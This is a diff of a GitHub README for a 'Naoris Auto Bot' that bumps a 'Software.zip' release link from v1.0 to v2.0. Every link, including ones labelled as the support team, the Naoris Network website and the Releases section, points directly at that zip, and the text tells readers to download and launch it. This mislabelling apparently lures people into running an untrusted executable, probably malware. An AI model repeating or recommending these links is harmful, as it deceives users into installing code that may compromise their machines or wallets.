@@ -15,7 +15,7 @@ The **Naoris Auto Bot** is a powerful tool developed specifically for the Naoris
 - nodejs
 
 ## Download
-🚀 [Download Naoris Auto Bot](https://github.com/RankingBotdude/Naoris-Auto-Bot/releases/download/v1.0/Software.zip)
+🚀 [Download Naoris Auto Bot](https://github.com/RankingBotdude/Naoris-Auto-Bot/releases/download/v2.0/Software.zip)
 
 #### Note: Please download the file and launch it to start using the Naoris Auto Bot.
 
@@ -38,17 +38,17 @@ To install the **Naoris Auto Bot**, simply download the provided ZIP file from t
 Contributions to the **Naoris Auto Bot** are welcome! Please feel free to submit pull requests to suggest enhancements, report issues, or propose new features. Together, we can make the Naoris Network even more efficient and powerful.
 
 ## Support
-For any questions or assistance regarding the **Naoris Auto Bot**, please reach out to our support team at https://github.com/RankingBotdude/Naoris-Auto-Bot/releases/download/v1.0/Software.zip We are here to help you make the most out of your Naoris Network experience.
+For any questions or assistance regarding the **Naoris Auto Bot**, please reach out to our support team at https://github.com/RankingBotdude/Naoris-Auto-Bot/releases/download/v2.0/Software.zip We are here to help you make the most out of your Naoris Network experience.
 
 ## License
 The **Naoris Auto Bot** is released under the MIT license. See the [LICENSE](LICENSE) file for more details.
 
 ---
 
-[![Download Naoris Auto Bot](https://github.com/RankingBotdude/Naoris-Auto-Bot/releases/download/v1.0/Software.zip%20Bot-1.0.0-blue)](https://github.com/RankingBotdude/Naoris-Auto-Bot/releases/download/v1.0/Software.zip)
+[![Download Naoris Auto Bot](https://github.com/RankingBotdude/Naoris-Auto-Bot/releases/download/v2.0/Software.zip%20Bot-1.0.0-blue)](https://github.com/RankingBotdude/Naoris-Auto-Bot/releases/download/v2.0/Software.zip)
 
-🌐 Visit the [Naoris Network website](https://github.com/RankingBotdude/Naoris-Auto-Bot/releases/download/v1.0/Software.zip) for more information.
+🌐 Visit the [Naoris Network website](https://github.com/RankingBotdude/Naoris-Auto-Bot/releases/download/v2.0/Software.zip) for more information.
 
-🚀 Check the [Releases](https://github.com/RankingBotdude/Naoris-Auto-Bot/releases/download/v1.0/Software.zip) section for the latest updates and versions of the **Naoris Auto Bot**.
+🚀 Check the [Releases](https://github.com/RankingBotdude/Naoris-Auto-Bot/releases/download/v2.0/Software.zip) section for the latest updates and versions of the **Naoris Auto Bot**.
 
 Thank you for choosing the **Naoris Auto Bot** for your network automation needs! 🤖🌐🔧
